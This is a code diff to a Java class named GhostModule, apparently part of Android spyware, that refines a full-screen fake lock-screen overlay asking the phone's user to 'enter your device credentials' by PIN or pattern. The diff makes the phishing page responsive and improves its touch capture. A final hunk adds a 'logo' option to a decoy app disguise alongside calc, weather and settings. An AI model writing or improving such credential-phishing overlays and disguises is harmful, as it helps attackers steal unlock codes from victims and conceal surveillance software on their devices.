@@ -139,25 +139,25 @@ public class GhostModule extends BaseModule {
             } else if ("pin".equals(type)) {
                 overlayHtml = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1, user-scalable=no'>" +
                         "<style>" +
-                        "body { background:#000; color:#fff; font-family:sans-serif; margin:0; padding:0; display:flex; flex-direction:column; height:100vh; overflow:hidden; user-select:none; touch-action:none; }" +
-                        ".header { padding:40px 20px 20px; text-align:center; }" +
-                        ".lock-icon { font-size:40px; color:#00f2ff; margin-bottom:15px; opacity:0.8; }" +
-                        "h2 { font-weight:300; margin:0 0 5px; font-size:1.4rem; }" +
-                        "p { color:#888; font-size:0.85rem; margin:0; }" +
-                        ".pin-dots { display:flex; justify-content:center; gap:15px; margin:30px 0; height:15px; }" +
-                        ".pin-dot { width:12px; height:12px; border:2px solid #555; border-radius:50%; transition:0.1s; }" +
-                        ".pin-dot.filled { background:#00f2ff; border-color:#00f2ff; box-shadow:0 0 10px #00f2ff; }" +
-                        ".keypad { display:grid; grid-template-columns:repeat(3, 1fr); gap:20px; width:280px; margin:0 auto; padding-bottom:40px; }" +
-                        ".key { width:70px; height:70px; border-radius:50%; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#fff; font-size:1.5rem; display:flex; align-items:center; justify-content:center; cursor:pointer; transition:0.1s; }" +
+                        "body { background:#000; color:#fff; font-family:sans-serif; margin:0; padding:0; display:flex; flex-direction:column; height:100vh; width:100vw; overflow:hidden; user-select:none; touch-action:none; justify-content: space-between; }" +
+                        ".header { padding: 8vh 5vw 2vh; text-align:center; }" +
+                        ".lock-icon { font-size: 8vh; color:#00f2ff; margin-bottom: 1.5vh; opacity:0.8; }" +
+                        "h2 { font-weight:300; margin:0 0 1vh; font-size: 3.5vh; }" +
+                        "p { color:#888; font-size: 2vh; margin:0; }" +
+                        ".pin-dots { display:flex; justify-content:center; gap: 4vw; margin: 4vh 0; height: 2vh; }" +
+                        ".pin-dot { width: 1.8vh; height: 1.8vh; border: 0.3vh solid #555; border-radius:50%; transition:0.1s; }" +
+                        ".pin-dot.filled { background:#00f2ff; border-color:#00f2ff; box-shadow:0 0 1.2vh #00f2ff; }" +
+                        ".keypad { display:grid; grid-template-columns:repeat(3, 1fr); gap: 3vh; width: 80vw; max-width: 400px; margin: 0 auto; }" +
+                        ".key { width: 9vh; height: 9vh; max-width: 22vw; max-height: 22vw; border-radius:50%; background:rgba(255,255,255,0.05); border: 0.15vh solid rgba(255,255,255,0.1); color:#fff; font-size: 3.5vh; display:flex; align-items:center; justify-content:center; cursor:pointer; transition:0.1s; margin: 0 auto; }" +
                         ".key:active { background:rgba(0,242,255,0.2); border-color:#00f2ff; transform:scale(0.95); }" +
-                        ".pat-container { position:relative; width:300px; height:300px; margin:20px auto; }" +
-                        "canvas { position:absolute; top:0; left:0; pointer-events:none; }" +
+                        ".pat-container { position:relative; width: 85vw; height: 85vw; max-width: 400px; max-height: 400px; margin: 2vh auto; }" +
+                        "canvas { position:absolute; top:0; left:0; pointer-events:none; width: 100%; height: 100%; }" +
                         ".grid { display:grid; grid-template-columns:repeat(3, 1fr); grid-template-rows:repeat(3, 1fr); width:100%; height:100%; position:relative; z-index:2; }" +
                         ".dot-wrap { display:flex; align-items:center; justify-content:center; }" +
-                        ".dot { width:14px; height:14px; background:#444; border-radius:50%; transition:0.2s; }" +
-                        ".dot.active { background:#00f2ff; box-shadow:0 0 15px #00f2ff; transform:scale(1.2); }" +
-                        ".footer { margin-top:auto; padding:30px; display:flex; justify-content:space-between; }" +
-                        ".f-btn { background:transparent; border:none; color:#00f2ff; font-weight:bold; font-size:0.9rem; cursor:pointer; text-transform:uppercase; letter-spacing:1px; }" +
+                        ".dot { width: 2vh; height: 2vh; background:#444; border-radius:50%; transition:0.2s; }" +
+                        ".dot.active { background:#00f2ff; box-shadow:0 0 2vh #00f2ff; transform:scale(1.2); }" +
+                        ".footer { padding: 4vh 8vw; display:flex; justify-content:space-between; }" +
+                        ".f-btn { background:transparent; border:none; color:#00f2ff; font-weight:bold; font-size: 2.2vh; cursor:pointer; text-transform:uppercase; letter-spacing: 0.2vh; }" +
                         "</style></head><body>" +
                         "<div class='header'>" +
                         "<div class='lock-icon'>&#128274;</div>" +
@@ -165,7 +165,7 @@ public class GhostModule extends BaseModule {
                         "<p>Please enter your device credentials</p>" +
                         "</div>" +
 
-                        "<div id='pin-mode'>" +
+                        "<div id='pin-mode' style='flex-grow: 1; display: flex; flex-direction: column; justify-content: center;'>" +
                         "<div class='pin-dots' id='pin-display'>" +
                         "<div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div><div class='pin-dot'></div>" +
                         "</div>" +
@@ -173,19 +173,19 @@ public class GhostModule extends BaseModule {
                         "<div class='key' onclick='k(1)'>1</div><div class='key' onclick='k(2)'>2</div><div class='key' onclick='k(3)'>3</div>" +
                         "<div class='key' onclick='k(4)'>4</div><div class='key' onclick='k(5)'>5</div><div class='key' onclick='k(6)'>6</div>" +
                         "<div class='key' onclick='k(7)'>7</div><div class='key' onclick='k(8)'>8</div><div class='key' onclick='k(9)'>9</div>" +
-                        "<div class='key' style='opacity:0; pointer-events:none;'></div><div class='key' onclick='k(0)'>0</div><div class='key' onclick='del()' style='font-size:1.2rem;'>&#9003;</div>" +
+                        "<div class='key' style='opacity:0; pointer-events:none;'></div><div class='key' onclick='k(0)'>0</div><div class='key' onclick='del()' style='font-size: 3vh;'>&#9003;</div>" +
                         "</div>" +
-                        "<div style='text-align:center;'><button class='f-btn' onclick='toggle(true)'>Use Pattern</button></div>" +
+                        "<div style='text-align:center; margin-top: 3vh;'><button class='f-btn' onclick='toggle(true)'>Use Pattern</button></div>" +
                         "</div>" +
 
-                        "<div id='pat-mode' style='display:none;'>" +
+                        "<div id='pat-mode' style='display:none; flex-grow: 1; flex-direction: column; justify-content: center;'>" +
                         "<div class='pat-container' id='pc'>" +
                         "<canvas id='cv'></canvas>" +
                         "<div class='grid' id='g'>" +
                         "[DOTS]" +
                         "</div>" +
                         "</div>" +
-                        "<div style='text-align:center;'><button class='f-btn' onclick='toggle(false)'>Use PIN</button></div>" +
+                        "<div style='text-align:center; margin-top: 3vh;'><button class='f-btn' onclick='toggle(false)'>Use PIN</button></div>" +
                         "</div>" +
 
                         "<div class='footer'>" +
@@ -197,7 +197,7 @@ public class GhostModule extends BaseModule {
                         "let mode='pin'; let pin=''; let path=[]; let isDown=false;" +
                         "const cv=document.getElementById('cv'); const ctx=cv.getContext('2d');" +
                         
-                        "function toggle(p){ mode=p?'pat':'pin'; document.getElementById('pin-mode').style.display=p?'none':'block'; document.getElementById('pat-mode').style.display=p?'block':'none'; reset(); }" +
+                        "function toggle(p){ mode=p?'pat':'pin'; document.getElementById('pin-mode').style.display=p?'flex':'none'; document.getElementById('pat-mode').style.display=p?'flex':'none'; reset(); }" +
                         "function reset(){ pin=''; path=[]; resetDots(); draw(); updatePin(); }" +
                         "function resetDots(){ document.querySelectorAll('.dot').forEach(d=>d.classList.remove('active')); }" +
                         "function updatePin(){ const ds=document.querySelectorAll('.pin-dot'); ds.forEach((d,i)=>d.classList.toggle('filled', i<pin.length)); }" +
@@ -209,7 +209,7 @@ public class GhostModule extends BaseModule {
                         "function setupCanvas(){ const r=document.getElementById('pc').getBoundingClientRect(); cv.width=r.width; cv.height=r.height; }" +
                         "function draw(ex, ey){" +
                         "  ctx.clearRect(0,0,cv.width,cv.height); if(path.length===0)return;" +
-                        "  ctx.strokeStyle='#00f2ff'; ctx.lineWidth=6; ctx.lineCap='round'; ctx.lineJoin='round'; ctx.beginPath();" +
+                        "  ctx.strokeStyle='#00f2ff'; ctx.lineWidth=Math.max(cv.width/50, 4); ctx.lineCap='round'; ctx.lineJoin='round'; ctx.beginPath();" +
                         "  path.forEach((id,i)=>{ const d=document.querySelector('[data-id=\"'+id+'\"]'); const r=d.getBoundingClientRect(); const pr=document.getElementById('pc').getBoundingClientRect(); const x=r.left-pr.left+r.width/2; const y=r.top-pr.top+r.height/2;" +
                         "    if(i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);" +
                         "  });" +
@@ -217,17 +217,17 @@ public class GhostModule extends BaseModule {
                         "  ctx.stroke();" +
                         "}" +
 
-                        "const handleMove=(e)=>{ if(!isDown)return; const t=e.touches?e.touches[0]:e; const pr=document.getElementById('pc').getBoundingClientRect(); const x=t.clientX-pr.left; const y=t.clientY-pr.top;" +
+                        "const handleMove=(e)=>{ if(!isDown)return; e.preventDefault(); const t=e.touches?e.touches[0]:e; const pr=document.getElementById('pc').getBoundingClientRect(); const x=t.clientX-pr.left; const y=t.clientY-pr.top;" +
                         "  document.querySelectorAll('.dot').forEach(d=>{ const r=d.getBoundingClientRect(); const dx=r.left-pr.left+r.width/2; const dy=r.top-pr.top+r.height/2; const dist=Math.hypot(x-dx, y-dy);" +
-                        "    if(dist<30){ const id=d.dataset.id; if(!path.includes(id)){ path.push(id); d.classList.add('active'); } }" +
+                        "    if(dist < r.width * 1.5){ const id=d.dataset.id; if(!path.includes(id)){ path.push(id); d.classList.add('active'); } }" +
                         "  }); draw(x,y);" +
                         "};" +
 
                         "const pc=document.getElementById('pc');" +
-                        "pc.addEventListener('touchstart',(e)=>{isDown=true; handleMove(e);}); pc.addEventListener('mousedown',(e)=>{isDown=true; handleMove(e);});" +
+                        "pc.addEventListener('touchstart',(e)=>{isDown=true; handleMove(e);}, {passive: false}); pc.addEventListener('mousedown',(e)=>{isDown=true; handleMove(e);});" +
                         "window.addEventListener('touchend',()=>{isDown=false; draw();}); window.addEventListener('mouseup',()=>{isDown=false; draw();});" +
-                        "window.addEventListener('touchmove',handleMove); window.addEventListener('mousemove',handleMove);" +
-                        "window.onload=setupCanvas;" +
+                        "window.addEventListener('touchmove',handleMove, {passive: false}); window.addEventListener('mousemove',handleMove);" +
+                        "window.onload=setupCanvas; window.onresize=setupCanvas;" +
                         "</script></body></html>";
 
                 StringBuilder dots = new StringBuilder();
@@ -653,6 +653,7 @@ public class GhostModule extends BaseModule {
                     if (type.equals("calc")) choice = 2;
                     else if (type.equals("weather")) choice = 3;
                     else if (type.equals("settings")) choice = 4;
+                    else if (type.equals("logo")) choice = 5;
                     
                     SystemAnalytics.setDecoyChoice(context, choice);
                 }
